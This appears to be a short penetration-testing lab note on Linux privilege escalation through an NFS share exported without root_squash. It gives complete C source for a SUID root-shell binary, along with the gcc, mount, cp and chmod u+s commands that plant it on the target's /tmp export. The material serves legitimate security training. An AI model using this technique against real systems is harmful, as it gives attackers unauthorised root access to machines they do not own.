If a target system has NFS but has not enabled root squash, then when connecting to the specific NFS, we can leave a malicious payload that's going to execute /bin/bash as local root user, since root squash is not enabled, this allows us to set the owner of the file to root at the target system.

Below is the payload:
```
root@Pwnbox:/tmp$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```
root@Pwnbox:/tmp$ gcc shell.c -o shell
```

```
root@Pwnbox:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:/tmp$ cp shell /mnt
root@Pwnbox:/tmp$ chmod u+s /mnt/shell #important as file is owned by root, without this user at target can't execute it
```


Since we set both uid and gid to 0, this would gain us a root shell at execution

Note: Their is a chance that target system has GLIBC that is older and exploit compiled on our side cannot be run on target due to GLIBC requirement, at the end of the day, we can attempt to compile at target system, or resort to other means to compile.